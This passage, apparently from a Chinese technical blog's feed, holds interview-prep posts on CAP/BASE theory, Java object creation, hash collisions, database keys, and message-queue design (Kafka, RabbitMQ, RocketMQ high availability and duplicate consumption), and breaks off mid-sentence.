Tolerance），最多只能同时满足其中两项。</p><h2><span id="一致性">一致性</span></h2><p>一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。</p><p>对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。</p><h2><span id="可用性">可用性</span></h2><p>可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。</p><p>在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。</p><h2><span id="分区容忍性">分区容忍性</span></h2><p>网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。</p><p>在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。</p><h2><span id="权衡">权衡</span></h2><p>在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。</p><p>可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时，</p><ul><li>为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用性；</li><li>为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致。</li></ul><h1><span id="base">BASE</span></h1><p>BASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。</p><p>BASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。</p><h2><span id="基本可用">基本可用</span></h2><p>指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。</p><p>例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。</p><h2><span id="软状态">软状态</span></h2><p>指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。</p><h2><span id="最终一致性">最终一致性</span></h2><p>最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。</p><p>ACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。</p><p>在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里面试</title>
      <link href="/2020/04/08/DBQA/"/>
      <url>/2020/04/08/DBQA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了阿里面试题</p><a id="more"></a><!-- toc --><ul><li><a href="#java">Java</a><ul><li><a href="#java-new一个对象的过程中发生了什么">java new一个对象的过程中发生了什么</a></li></ul></li><li><a href="#哈希">哈希</a><ul><li><a href="#解决哈希碰撞的方法">解决哈希碰撞的方法</a></li></ul></li><li><a href="#数据库">数据库</a><ul><li><a href="#主键和唯一索引的区别以及索引的优缺点">主键和唯一索引的区别以及索引的优缺点</a></li></ul></li></ul><!-- tocstop --><h1><span id="java">Java</span></h1><h2><span id="java-new一个对象的过程中发生了什么">java new一个对象的过程中发生了什么</span></h2><p>java在new一个对象的时候，会先查看对象所属的类有没有被加载到内存，如果没有的话，就会先通过类的全限定名来加载。加载并初始化类完成后，再进行对象的创建工作。</p><p>我们先假设是第一次使用该类，这样的话new一个对象就可以分为两个过程：<strong>加载并初始化类</strong>和<strong>创建对象</strong>。</p><p>类加载和初始化过程略</p><p><strong>1、在堆区分配对象需要的内存</strong></p><p>　　分配的内存包括本类和父类的所有实例变量，但不包括任何静态变量</p><p><strong>2、对所有实例变量赋默认值</strong></p><p>　　将方法区内对实例变量的定义拷贝一份到堆区，然后赋默认值</p><p><strong>3、执行实例初始化代码</strong></p><p>　　初始化顺序是先初始化父类再初始化子类，初始化时先执行实例代码块然后是构造方法</p><p><strong>4、如果有类似于Child c = new Child()形式的c引用的话，在栈区定义Child类型引用变量c，然后将堆区对象的地址赋值给它</strong></p><h1><span id="哈希">哈希</span></h1><h2><span id="解决哈希碰撞的方法">解决哈希碰撞的方法</span></h2><ol><li><p>开放定址法<br>所谓的开放定址法就是一旦发生了冲突，就去寻找下一个空的散列地址，只要散列表足够大，空的散列地址总能找到，并将记录存入 </p></li><li><p>再哈希法</p><p>有多个不同的Hash函数，当发生冲突时，使用第二个，第三个，….，等哈希函数<br>计算地址，直到无冲突。虽然不易发生聚集，但是增加了计算时间。</p></li><li><p>拉链法</p><p>每个哈希表节点都有一个next指针，多个哈希表节点可以用next指针构成一个单向链表，被分配到同一个索引上的多个节点可以用这个单向<br>链表连接起来</p></li></ol><h1><span id="数据库">数据库</span></h1><h2><span id="主键和唯一索引的区别以及索引的优缺点">主键和唯一索引的区别以及索引的优缺点</span></h2><p>一 主键和唯一索引都要求值唯一，但是它们还是有区别的：</p><p>1.主键是一种约束，唯一索引是一种索引；<br>2.一张表只能有一个主键，但可以创建多个唯一索引；<br>3.主键创建后一定包含一个唯一索引，唯一索引并一定是主键；<br>4.主键不能为null，唯一索引可以为null；<br>5.主键可以做为外键，唯一索引不行；<br>6.主键产生唯一的聚集索引，唯一索引产生唯一的非聚集索引</p><p>注：聚簇索引确定表中数据的物理顺序，所以是主键是唯一的</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阿里面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>消息队列</title>
      <link href="/2020/04/07/mq/"/>
      <url>/2020/04/07/mq/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了常考的消息队列知识点。</p><a id="more"></a><!-- toc --><ul><li><a href="#为什么使用消息队列消息队列有什么优点和缺点kafka-activemq-rabbitmq-rocketmq-都有什么区别以及适合哪些场景">为什么使用消息队列？消息队列有什么优点和缺点？Kafka、ActiveMQ、RabbitMQ、RocketMQ 都有什么区别，以及适合哪些场景？</a><ul><li><a href="#面试官心理分析">面试官心理分析</a></li><li><a href="#面试题剖析">面试题剖析</a><ul><li><a href="#为什么使用消息队列">为什么使用消息队列</a><ul><li><a href="#解耦">解耦</a></li><li><a href="#异步">异步</a></li><li><a href="#削峰">削峰</a></li></ul></li><li><a href="#消息队列有什么优缺点">消息队列有什么优缺点</a></li><li><a href="#kafka-activemq-rabbitmq-rocketmq-有什么优缺点">Kafka、ActiveMQ、RabbitMQ、RocketMQ 有什么优缺点？</a></li></ul></li></ul></li><li><a href="#如何保证消息队列的高可用">如何保证消息队列的高可用？</a><ul><li><a href="#面试官心理分析-1">面试官心理分析</a></li><li><a href="#面试题剖析-1">面试题剖析</a><ul><li><a href="#rabbitmq-的高可用性">RabbitMQ 的高可用性</a><ul><li><a href="#单机模式">单机模式</a></li><li><a href="#普通集群模式无高可用性">普通集群模式（无高可用性）</a></li><li><a href="#镜像集群模式高可用性">镜像集群模式（高可用性）</a></li></ul></li><li><a href="#kafka-的高可用性">Kafka 的高可用性</a></li></ul></li></ul></li><li><a href="#如何保证消息不被重复消费或者说如何保证消息消费的幂等性">如何保证消息不被重复消费？或者说，如何保证消息消费的幂等性？</a><ul><li><a href="#面试官心理分析-2">面试官心理分析</a></li><li><a href="#面试题剖析-2">面试题剖析</a></li></ul></li><li><a href="#如何保证消息的可靠性传输或者说如何处理消息丢失的问题">如何保证消息的可靠性传输？或者说，如何处理消息丢失的问题？</a><ul><li><a href="#面试官心理分析-3">面试官心理分析</a></li><li><a href="#面试题剖析-3">面试题剖析</a><ul><li><a href="#rabbitmq">RabbitMQ</a><ul><li><a href="#生产者弄丢了数据">生产者弄丢了数据</a></li><li><a href="#rabbitmq-弄丢了数据">RabbitMQ 弄丢了数据</a></li><li><a href="#消费端弄丢了数据">消费端弄丢了数据</a></li></ul></li><li><a href="#kafka">Kafka</a><ul><li><a href="#消费端弄丢了数据-1">消费端弄丢了数据</a></li><li><a href="#kafka-弄丢了数据">Kafka 弄丢了数据</a></li><li><a href="#生产者会不会弄丢数据">生产者会不会弄丢数据？</a></li></ul></li></ul></li></ul></li><li><a href="#如何保证消息的顺序性">如何保证消息的顺序性？</a><ul><li><a href="#面试官心理分析-4">面试官心理分析</a></li><li><a href="#面试题剖析-4">面试题剖析</a><ul><li><a href="#解决方案">解决方案</a><ul><li><a href="#rabbitmq-1">RabbitMQ</a></li><li><a href="#kafka-1">Kafka</a></li></ul></li></ul></li></ul></li><li><a href="#如何解决消息队列的延时以及过期失效问题消息队列满了以后该怎么处理有几百万消息持续积压几小时说说怎么解决">如何解决消息队列的延时以及过期失效问题？消息队列满了以后该怎么处理？有几百万消息持续积压几小时，说说怎么解决？</a><ul><li><a href="#面试官心理分析-5">面试官心理分析</a></li><li><a href="#面试题剖析-5">面试题剖析</a><ul><li><a href="#大量消息在-mq-里积压了几个小时了还没解决">大量消息在 mq 里积压了几个小时了还没解决</a></li><li><a href="#mq-中的消息过期失效了">mq 中的消息过期失效了</a></li><li><a href="#mq-都快写满了">mq 都快写满了</a></li></ul></li></ul></li><li><a href="#如果让你写一个消息队列该如何进行架构设计说一下你的思路">如果让你写一个消息队列，该如何进行架构设计？说一下你的思路。</a><ul><li><a href="#面试官心理分析-6">面试官心理分析</a></li><li><a href="#面试题剖析-6">面试题剖析</a></li></ul></li></ul><!-- tocstop --><h1><span id="为什么使用消息队列消息队列有什么优点和缺点kafka-activemq-rabbitmq-rocketmq-都有什么区别以及适合哪些场景">为什么使用消息队列？消息队列有什么优点和缺点？Kafka、ActiveMQ、RabbitMQ、RocketMQ 都有什么区别，以及适合哪些场景？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>其实面试官主要是想看看：</p><ul><li><p><strong>第一</strong>，你知不知道你们系统里为什么要用消息队列这个东西？<br><br>不少候选人，说自己项目里用了 Redis、MQ，但是其实他并不知道自己为什么要用这个东西。其实说白了，就是为了用而用，或者是别人设计的架构，他从头到尾都没思考过。<br><br>没有对自己的架构问过为什么的人，一定是平时没有思考的人，面试官对这类候选人印象通常很不好。因为面试官担心你进了团队之后只会木头木脑的干呆活儿，不会自己思考。</p></li><li><p><strong>第二</strong>，你既然用了消息队列这个东西，你知不知道用了有什么好处&amp;坏处？<br><br>你要是没考虑过这个，那你盲目弄个 MQ 进系统里，后面出了问题你是不是就自己溜了给公司留坑？你要是没考虑过引入一个技术可能存在的弊端和风险，面试官把这类候选人招进来了，基本可能就是挖坑型选手。就怕你干 1 年挖一堆坑，自己跳槽了，给公司留下无穷后患。</p></li><li><p><strong>第三</strong>，既然你用了 MQ，可能是某一种 MQ，那么你当时做没做过调研？<br><br>你别傻乎乎的自己拍脑袋看个人喜好就瞎用了一个 MQ，比如 Kafka，甚至都从没调研过业界流行的 MQ 到底有哪几种。每一个 MQ 的优点和缺点是什么。每一个 MQ <strong>没有绝对的好坏</strong>，但是就是看用在哪个场景可以<strong>扬长避短，利用其优势，规避其劣势</strong>。<br><br>如果是一个不考虑技术选型的候选人招进了团队，leader 交给他一个任务，去设计个什么系统，他在里面用一些技术，可能都没考虑过选型，最后选的技术可能并不一定合适，一样是留坑。</p></li></ul><h2><span id="面试题剖析">面试题剖析</span></h2><h3><span id="为什么使用消息队列">为什么使用消息队列</span></h3><p>其实就是问问你消息队列都有哪些使用场景，然后你项目里具体是什么场景，说说你在这个场景里用消息队列是什么？</p><p>面试官问你这个问题，<strong>期望的一个回答</strong>是说，你们公司有个什么<strong>业务场景</strong>，这个业务场景有个什么技术挑战，如果不用 MQ 可能会很麻烦，但是你现在用了 MQ 之后带给了你很多的好处。</p><p>先说一下消息队列常见的使用场景吧，其实场景有很多，但是比较核心的有 3 个：<strong>解耦</strong>、<strong>异步</strong>、<strong>削峰</strong>。</p><h4><span id="解耦">解耦</span></h4><p>看这么个场景。A 系统发送数据到 BCD 三个系统，通过接口调用发送。如果 E 系统也要这个数据呢？那如果 C 系统现在不需要了呢？A 系统负责人几乎崩溃……</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-1.png" alt="mq-1"></p><p>在这个场景中，A 系统跟其它各种乱七八糟的系统严重耦合，A 系统产生一条比较关键的数据，很多系统都需要 A 系统将这个数据发送过来。A 系统要时时刻刻考虑 BCDE 四个系统如果挂了该咋办？要不要重发，要不要把消息存起来？头发都白了啊！</p><p>如果使用 MQ，A 系统产生一条数据，发送到 MQ 里面去，哪个系统需要数据自己去 MQ 里面消费。如果新系统需要数据，直接从 MQ 里消费即可；如果某个系统不需要这条数据了，就取消对 MQ 消息的消费即可。这样下来，A 系统压根儿不需要去考虑要给谁发送数据，不需要维护这个代码，也不需要考虑人家是否调用成功、失败超时等情况。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-2.png" alt="mq-2"></p><p><strong>总结</strong>：通过一个 MQ，Pub/Sub 发布订阅消息这么一个模型，A 系统就跟其它系统彻底解耦了。</p><p><strong>面试技巧</strong>：你需要去考虑一下你负责的系统中是否有类似的场景，就是一个系统或者一个模块，调用了多个系统或者模块，互相之间的调用很复杂，维护起来很麻烦。但是其实这个调用是不需要直接同步调用接口的，如果用 MQ 给它异步化解耦，也是可以的，你就需要去考虑在你的项目里，是不是可以运用这个 MQ 去进行系统的解耦。在简历中体现出来这块东西，用 MQ 作解耦。</p><h4><span id="异步">异步</span></h4><p>再来看一个场景，A 系统接收一个请求，需要在自己本地写库，还需要在 BCD 三个系统写库，自己本地写库要 3ms，BCD 三个系统分别写库要 300ms、450ms、200ms。最终请求总延时是 3 + 300 + 450 + 200 = 953ms，接近 1s，用户感觉搞个什么东西，慢死了慢死了。用户通过浏览器发起请求，等待个 1s，这几乎是不可接受的。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-3.png" alt="mq-3"></p><p>一般互联网类的企业，对于用户直接的操作，一般要求是每个请求都必须在 200 ms 以内完成，对用户几乎是无感知的。</p><p>如果<strong>使用 MQ</strong>，那么 A 系统连续发送 3 条消息到 MQ 队列中，假如耗时 5ms，A 系统从接受一个请求到返回响应给用户，总时长是 3 + 5 = 8ms，对于用户而言，其实感觉上就是点个按钮，8ms 以后就直接返回了，爽！网站做得真好，真快！</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-4.png" alt="mq-4"></p><h4><span id="削峰">削峰</span></h4><p>每天 0:00 到 12:00，A 系统风平浪静，每秒并发请求数量就 50 个。结果每次一到 12:00 ~ 13:00 ，每秒并发请求数量突然会暴增到 5k+ 条。但是系统是直接基于 MySQL 的，大量的请求涌入 MySQL，每秒钟对 MySQL 执行约 5k 条 SQL。</p><p>一般的 MySQL，扛到每秒 2k 个请求就差不多了，如果每秒请求到 5k 的话，可能就直接把 MySQL 给打死了，导致系统崩溃，用户也就没法再使用系统了。</p><p>但是高峰期一过，到了下午的时候，就成了低峰期，可能也就 1w 的用户同时在网站上操作，每秒中的请求数量可能也就 50 个请求，对整个系统几乎没有任何的压力。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-5.png" alt="mq-5"></p><p>如果使用 MQ，每秒 5k 个请求写入 MQ，A 系统每秒钟最多处理 2k 个请求，因为 MySQL 每秒钟最多处理 2k 个。A 系统从 MQ 中慢慢拉取请求，每秒钟就拉取 2k 个请求，不要超过自己每秒能处理的最大请求数量就 ok，这样下来，哪怕是高峰期的时候，A 系统也绝对不会挂掉。而 MQ 每秒钟 5k 个请求进来，就 2k 个请求出去，结果就导致在中午高峰期（1 个小时），可能有几十万甚至几百万的请求积压在 MQ 中。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-6.png" alt="mq-6"></p><p>这个短暂的高峰期积压是 ok 的，因为高峰期过了之后，每秒钟就 50 个请求进 MQ，但是 A 系统依然会按照每秒 2k 个请求的速度在处理。所以说，只要高峰期一过，A 系统就会快速将积压的消息给解决掉。</p><h3><span id="消息队列有什么优缺点">消息队列有什么优缺点</span></h3><p>优点上面已经说了，就是<strong>在特殊场景下有其对应的好处</strong>，<strong>解耦</strong>、<strong>异步</strong>、<strong>削峰</strong>。</p><p>缺点有以下几个：</p><ul><li><p>系统可用性降低<br><br>系统引入的外部依赖越多，越容易挂掉。本来你就是 A 系统调用 BCD 三个系统的接口就好了，ABCD 四个系统还好好的，没啥问题，你偏加个 MQ 进来，万一 MQ 挂了咋整？MQ 一挂，整套系统崩溃，你不就完了？如何保证消息队列的高可用，可以<a href="/docs/high-concurrency/how-to-ensure-high-availability-of-message-queues.md">点击这里查看</a>。</p></li><li><p>系统复杂度提高<br><br>硬生生加个 MQ 进来，你怎么<a href="/docs/high-concurrency/how-to-ensure-that-messages-are-not-repeatedly-consumed.md">保证消息没有重复消费</a>？怎么<a href="/docs/high-concurrency/how-to-ensure-the-reliable-transmission-of-messages.md">处理消息丢失的情况</a>？怎么保证消息传递的顺序性？头大头大，问题一大堆，痛苦不已。</p></li><li><p>一致性问题<br><br>A 系统处理完了直接返回成功了，人都以为你这个请求就成功了；但是问题是，要是 BCD 三个系统那里，BD 两个系统写库成功了，结果 C 系统写库失败了，咋整？你这数据就不一致了。</p></li></ul><p>所以消息队列实际是一种非常复杂的架构，你引入它有很多好处，但是也得针对它带来的坏处做各种额外的技术方案和架构来规避掉，做好之后，你会发现，妈呀，系统复杂度提升了一个数量级，也许是复杂了 10 倍。但是关键时刻，用，还是得用的。</p><h3><span id="kafka-activemq-rabbitmq-rocketmq-有什么优缺点">Kafka、ActiveMQ、RabbitMQ、RocketMQ 有什么优缺点？</span></h3><table><thead><tr><th>特性</th><th>ActiveMQ</th><th>RabbitMQ</th><th>RocketMQ</th><th>Kafka</th></tr></thead><tbody><tr><td>单机吞吐量</td><td>万级，比 RocketMQ、Kafka 低一个数量级</td><td>同 ActiveMQ</td><td>10 万级，支撑高吞吐</td><td>10 万级，高吞吐，一般配合大数据类的系统来进行实时数据计算、日志采集等场景</td></tr><tr><td>topic 数量对吞吐量的影响</td><td></td><td></td><td>topic 可以达到几百/几千的级别，吞吐量会有较小幅度的下降，这是 RocketMQ 的一大优势，在同等机器下，可以支撑大量的 topic</td><td>topic 从几十到几百个时候，吞吐量会大幅度下降，在同等机器下，Kafka 尽量保证 topic 数量不要过多，如果要支撑大规模的 topic，需要增加更多的机器资源</td></tr><tr><td>时效性</td><td>ms 级</td><td>微秒级，这是 RabbitMQ 的一大特点，延迟最低</td><td>ms 级</td><td>延迟在 ms 级以内</td></tr><tr><td>可用性</td><td>高，基于主从架构实现高可用</td><td>同 ActiveMQ</td><td>非常高，分布式架构</td><td>非常高，分布式，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用</td></tr><tr><td>消息可靠性</td><td>有较低的概率丢失数据</td><td>基本不丢</td><td>经过参数优化配置，可以做到 0 丢失</td><td>同 RocketMQ</td></tr><tr><td>功能支持</td><td>MQ 领域的功能极其完备</td><td>基于 erlang 开发，并发能力很强，性能极好，延时很低</td><td>MQ 功能较为完善，还是分布式的，扩展性好</td><td>功能较为简单，主要支持简单的 MQ 功能，在大数据领域的实时计算以及日志采集被大规模使用</td></tr></tbody></table><p>综上，各种对比之后，有如下建议：</p><p>一般的业务系统要引入 MQ，最早大家都用 ActiveMQ，但是现在确实大家用的不多了，没经过大规模吞吐量场景的验证，社区也不是很活跃，所以大家还是算了吧，我个人不推荐用这个了；</p><p>后来大家开始用 RabbitMQ，但是确实 erlang 语言阻止了大量的 Java 工程师去深入研究和掌控它，对公司而言，几乎处于不可控的状态，但是确实人家是开源的，比较稳定的支持，活跃度也高；</p><p>不过现在确实越来越多的公司会去用 RocketMQ，确实很不错，毕竟是阿里出品，但社区可能有突然黄掉的风险（目前 RocketMQ 已捐给 <a href="https://github.com/apache/rocketmq" target="_blank" rel="noopener">Apache</a>，但 GitHub 上的活跃度其实不算高）对自己公司技术实力有绝对自信的，推荐用 RocketMQ，否则回去老老实实用 RabbitMQ 吧，人家有活跃的开源社区，绝对不会黄。</p><p>所以<strong>中小型公司</strong>，技术实力较为一般，技术挑战不是特别高，用 RabbitMQ 是不错的选择；<strong>大型公司</strong>，基础架构研发实力较强，用 RocketMQ 是很好的选择。</p><p>如果是<strong>大数据领域</strong>的实时计算、日志采集等场景，用 Kafka 是业内标准的，绝对没问题，社区活跃度很高，绝对不会黄，何况几乎是全世界这个领域的事实性规范。</p><h1><span id="如何保证消息队列的高可用">如何保证消息队列的高可用？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>如果有人问到你 MQ 的知识，<strong>高可用是必问的</strong>。上一讲提到，MQ 会导致<strong>系统可用性降低</strong>。所以只要你用了 MQ，接下来问的一些要点肯定就是围绕着 MQ 的那些缺点怎么来解决了。</p><p>要是你傻乎乎的就干用了一个 MQ，各种问题从来没考虑过，那你就杯具了，面试官对你的感觉就是，只会简单使用一些技术，没任何思考，马上对你的印象就不太好了。这样的同学招进来要是做个 20k 薪资以内的普通小弟还凑合，要是做薪资 20k+ 的高工，那就惨了，让你设计个系统，里面肯定一堆坑，出了事故公司受损失，团队一起背锅。</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>这个问题这么问是很好的，因为不能问你 Kafka 的高可用性怎么保证？ActiveMQ 的高可用性怎么保证？一个面试官要是这么问就显得很没水平，人家可能用的就是 RabbitMQ，没用过 Kafka，你上来问人家 Kafka 干什么？这不是摆明了刁难人么。</p><p>所以有水平的面试官，问的是 MQ 的高可用性怎么保证？这样就是你用过哪个 MQ，你就说说你对那个 MQ 的高可用性的理解。</p><h3><span id="rabbitmq-的高可用性">RabbitMQ 的高可用性</span></h3><p>RabbitMQ 是比较有代表性的，因为是<strong>基于主从</strong>（非分布式）做高可用性的，我们就以 RabbitMQ 为例子讲解第一种 MQ 的高可用性怎么实现。</p><p>RabbitMQ 有三种模式：单机模式、普通集群模式、镜像集群模式。</p><h4><span id="单机模式">单机模式</span></h4><p>单机模式，就是 Demo 级别的，一般就是你本地启动了玩玩儿的😄，没人生产用单机模式。</p><h4><span id="普通集群模式无高可用性">普通集群模式（无高可用性）</span></h4><p>普通集群模式，意思就是在多台机器上启动多个 RabbitMQ 实例，每个机器启动一个。你<strong>创建的 queue，只会放在一个 RabbitMQ 实例上</strong>，但是每个实例都同步 queue 的元数据（元数据可以认为是 queue 的一些配置信息，通过元数据，可以找到 queue 所在实例）。你消费的时候，实际上如果连接到了另外一个实例，那么那个实例会从 queue 所在实例上拉取数据过来。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-7.png" alt="mq-7"></p><p>这种方式确实很麻烦，也不怎么好，<strong>没做到所谓的分布式</strong>，就是个普通集群。因为这导致你要么消费者每次随机连接一个实例然后拉取数据，要么固定连接那个 queue 所在实例消费数据，前者有<strong>数据拉取的开销</strong>，后者导致<strong>单实例性能瓶颈</strong>。</p><p>而且如果那个放 queue 的实例宕机了，会导致接下来其他实例就无法从那个实例拉取，如果你<strong>开启了消息持久化</strong>，让 RabbitMQ 落地存储消息的话，<strong>消息不一定会丢</strong>，得等这个实例恢复了，然后才可以继续从这个 queue 拉取数据。</p><p>所以这个事儿就比较尴尬了，这就<strong>没有什么所谓的高可用性</strong>，<strong>这方案主要是提高吞吐量的</strong>，就是说让集群中多个节点来服务某个 queue 的读写操作。</p><h4><span id="镜像集群模式高可用性">镜像集群模式（高可用性）</span></h4><p>这种模式，才是所谓的 RabbitMQ 的高可用模式。跟普通集群模式不一样的是，在镜像集群模式下，你创建的 queue，无论元数据还是 queue 里的消息都会<strong>存在于多个实例上</strong>，就是说，每个 RabbitMQ 节点都有这个 queue 的一个<strong>完整镜像</strong>，包含 queue 的全部数据的意思。然后每次你写消息到 queue 的时候，都会自动把<strong>消息同步</strong>到多个实例的 queue 上。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-8.png" alt="mq-8"></p><p>那么<strong>如何开启这个镜像集群模式</strong>呢？其实很简单，RabbitMQ 有很好的管理控制台，就是在后台新增一个策略，这个策略是<strong>镜像集群模式的策略</strong>，指定的时候是可以要求数据同步到所有节点的，也可以要求同步到指定数量的节点，再次创建 queue 的时候，应用这个策略，就会自动将数据同步到其他的节点上去了。</p><p>这样的话，好处在于，你任何一个机器宕机了，没事儿，其它机器（节点）还包含了这个 queue 的完整数据，别的 consumer 都可以到其它节点上去消费数据。坏处在于，第一，这个性能开销也太大了吧，消息需要同步到所有机器上，导致网络带宽压力和消耗很重！第二，这么玩儿，不是分布式的，就<strong>没有扩展性可言</strong>了，如果某个 queue 负载很重，你加机器，新增的机器也包含了这个 queue 的所有数据，并<strong>没有办法线性扩展</strong>你的 queue。你想，如果这个 queue 的数据量很大，大到这个机器上的容量无法容纳了，此时该怎么办呢？</p><h3><span id="kafka-的高可用性">Kafka 的高可用性</span></h3><p>Kafka 一个最基本的架构认识：由多个 broker 组成，每个 broker 是一个节点；你创建一个 topic，这个 topic 可以划分为多个 partition，每个 partition 可以存在于不同的 broker 上，每个 partition 就放一部分数据。</p><p>这就是<strong>天然的分布式消息队列</strong>，就是说一个 topic 的数据，是<strong>分散放在多个机器上的，每个机器就放一部分数据</strong>。</p><p>实际上 RabbitMQ 之类的，并不是分布式消息队列，它就是传统的消息队列，只不过提供了一些集群、HA(High Availability, 高可用性) 的机制而已，因为无论怎么玩儿，RabbitMQ 一个 queue 的数据都是放在一个节点里的，镜像集群下，也是每个节点都放这个 queue 的完整数据。</p><p>Kafka 0.8 以前，是没有 HA 机制的，就是任何一个 broker 宕机了，那个 broker 上的 partition 就废了，没法写也没法读，没有什么高可用性可言。</p><p>比如说，我们假设创建了一个 topic，指定其 partition 数量是 3 个，分别在三台机器上。但是，如果第二台机器宕机了，会导致这个 topic 的 1/3 的数据就丢了，因此这个是做不到高可用的。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/kafka-before.png" alt="kafka-before"></p><p>Kafka 0.8 以后，提供了 HA 机制，就是 replica（复制品） 副本机制。每个 partition 的数据都会同步到其它机器上，形成自己的多个 replica 副本。所有 replica 会选举一个 leader 出来，那么生产和消费都跟这个 leader 打交道，然后其他 replica 就是 follower。写的时候，leader 会负责把数据同步到所有 follower 上去，读的时候就直接读 leader 上的数据即可。只能读写 leader？很简单，<strong>要是你可以随意读写每个 follower，那么就要 care 数据一致性的问题</strong>，系统复杂度太高，很容易出问题。Kafka 会均匀地将一个 partition 的所有 replica 分布在不同的机器上，这样才可以提高容错性。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/kafka-after.png" alt="kafka-after"></p><p>这么搞，就有所谓的<strong>高可用性</strong>了，因为如果某个 broker 宕机了，没事儿，那个 broker上面的 partition 在其他机器上都有副本的。如果这个宕机的 broker 上面有某个 partition 的 leader，那么此时会从 follower 中<strong>重新选举</strong>一个新的 leader 出来，大家继续读写那个新的 leader 即可。这就有所谓的高可用性了。</p><p><strong>写数据</strong>的时候，生产者就写 leader，然后 leader 将数据落地写本地磁盘，接着其他 follower 自己主动从 leader 来 pull 数据。一旦所有 follower 同步好数据了，就会发送 ack 给 leader，leader 收到所有 follower 的 ack 之后，就会返回写成功的消息给生产者。（当然，这只是其中一种模式，还可以适当调整这个行为）</p><p><strong>消费</strong>的时候，只会从 leader 去读，但是只有当一个消息已经被所有 follower 都同步成功返回 ack 的时候，这个消息才会被消费者读到。</p><p>看到这里，相信你大致明白了 Kafka 是如何保证高可用机制的了，对吧？不至于一无所知，现场还能给面试官画画图。要是遇上面试官确实是 Kafka 高手，深挖了问，那你只能说不好意思，太深入的你没研究过。</p><h1><span id="如何保证消息不被重复消费或者说如何保证消息消费的幂等性">如何保证消息不被重复消费？或者说，如何保证消息消费的幂等性？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>其实这是很常见的一个问题，这俩问题基本可以连起来问。既然是消费消息，那肯定要考虑会不会重复消费？能不能避免重复消费？或者重复消费了也别造成系统异常可以吗？这个是 MQ 领域的基本问题，其实本质上还是问你<strong>使用消息队列如何保证幂等性</strong>，这个是你架构里要考虑的一个问题。</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>回答这个问题，首先你别听到重复消息这个事儿，就一无所知吧，你<strong>先大概说一说可能会有哪些重复消费的问题</strong>。</p><p>首先，比如 RabbitMQ、RocketMQ、Kafka，都有可能会出现消息重复消费的问题，正常。因为这问题通常不是 MQ 自己保证的，是由我们开发来保证的。挑一个 Kafka 来举个例子，说说怎么重复消费吧。</p><p>Kafka 实际上有个 offset 的概念，就是每个消息写进去，都有一个 offset，代表消息的序号，然后 consumer 消费了数据之后，<strong>每隔一段时间</strong>（定时定期），会把自己消费过的消息的 offset 提交一下，表示“我已经消费过了，下次我要是重启啥的，你就让我继续从上次消费到的 offset 来继续消费吧”。</p><p>但是凡事总有意外，比如我们之前生产经常遇到的，就是你有时候重启系统，看你怎么重启了，如果碰到点着急的，直接 kill 进程了，再重启。这会导致 consumer 有些消息处理了，但是没来得及提交 offset，尴尬了。重启之后，少数消息会再次消费一次。</p><p>举个栗子。</p><p>有这么个场景。数据 1/2/3 依次进入 kafka，kafka 会给这三条数据每条分配一个 offset，代表这条数据的序号，我们就假设分配的 offset 依次是 